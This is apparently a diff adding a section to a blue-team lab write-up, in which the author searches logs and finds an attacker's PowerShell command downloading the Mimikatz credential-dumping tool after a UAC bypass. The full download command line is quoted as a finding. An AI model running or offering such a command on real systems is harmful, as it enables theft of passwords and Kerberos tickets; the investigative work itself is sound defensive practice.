@@ -149,6 +149,39 @@ Sorted by timestamp to view the sequence of execution events.
 
 Verified that fodhelper.exe was used directly after privilege escalation checks, confirming its role in the UAC bypass step.
 
+## Task 7 – Credential Dumping Tool Download (Mimikatz)
+
+**Command / Query Used**
+```kql
+download
+```
+![task7](./Screenshots/task7.png)  ![task7answer](./Screenshots/task7correct.png)
+
+The search term download was used to identify any suspicious file retrieval events in the logs.
+In this case, the logs revealed that PowerShell executed a command to download the Mimikatz credential dumping tool from GitHub.
+
+Key Findings
+
+Process Name: powershell.exe
+
+Process Command Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip
+
+The attacker used Invoke-WebRequest (iwr) in PowerShell to fetch the tool and saved it locally as mimi.zip.
+
+Source: GitHub repository for Mimikatz by gentilkiwi.
+
+Purpose: Mimikatz is a known tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory.
+
+What I Looked At
+
+Added the following fields for clarity:
+process.name, process.command_line, process.parent.command_line, process.parent.name, host.name.
+
+Verified that the command clearly pointed to a credential dumping intent.
+
+Sorted logs chronologically to confirm this occurred after the attacker obtained high privilege access.
+
+
 
 
 
